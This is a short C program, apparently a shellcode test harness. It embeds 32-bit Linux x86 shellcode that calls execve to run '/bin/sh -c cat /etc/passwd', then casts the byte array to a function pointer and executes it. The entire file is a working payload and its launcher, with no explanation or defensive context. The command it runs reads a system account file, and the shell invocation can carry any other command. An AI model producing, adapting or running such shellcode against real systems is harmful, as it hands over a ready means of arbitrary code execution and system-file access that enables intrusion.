#include <stdio.h>

unsigned char shellcode[] = \
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x10\x00\x00\x00\x63"
"\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00"
"\x57\x53\x89\xe1\xcd\x80";

int main() {
	printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	ret();
}
